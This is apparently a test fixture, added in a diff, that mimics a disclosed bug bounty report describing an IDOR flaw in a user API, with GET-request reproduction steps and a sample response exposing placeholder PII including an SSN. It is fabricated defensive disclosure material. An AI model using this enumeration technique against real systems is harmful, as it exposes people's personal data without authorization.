@@ -1,0 +1,14 @@
+{
+  "id": 900008,
+  "title": "IDOR in User API Endpoint Allows Enumeration of All User Records",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "visibility": "full",
+  "team": {"handle": "resurface-testapp", "name": "Resurface Test App"},
+  "reporter": {"username": "demo_hacker"},
+  "weakness": {"id": 55, "name": "Insecure Direct Object Reference (IDOR)"},
+  "vulnerability_information": "## Summary\nThe REST API endpoint `/api/user/<id>` returns full user details including PII for any user ID without authentication or authorization checks. An attacker can enumerate all user records by iterating through sequential IDs.\n\n## Steps to Reproduce\n1. Send a GET request to the API user endpoint:\n   ```\n   GET /api/user/1\n   ```\n2. Observe the full user record is returned including name, email, role, and SSN\n3. Change the ID to enumerate other users:\n   ```\n   GET /api/user/2\n   GET /api/user/3\n   ```\n4. Each request returns the complete user record without any auth check\n\n## Proof of Concept\n```http\nGET /api/user/1 HTTP/1.1\nHost: target.com\nAccept: application/json\n```\n\nResponse:\n```json\n{\n  \"id\": 1,\n  \"name\": \"Alice Admin\",\n  \"email\": \"alice@company.com\",\n  \"role\": \"admin\",\n  \"ssn\": \"123-45-6789\"\n}\n```\n\nAll user IDs from 1-5 return valid data with SSNs.\n\n## Impact\n- Complete exposure of all user PII (names, emails, Social Security Numbers)\n- Admin role identification for privilege escalation\n- Mass data exfiltration possible via automated enumeration\n- Regulatory violations (GDPR, CCPA) due to unprotected PII access",
+  "disclosed_at": "2025-09-10T15:00:00.000Z",
+  "bounty_amount": "2000.0"
+}
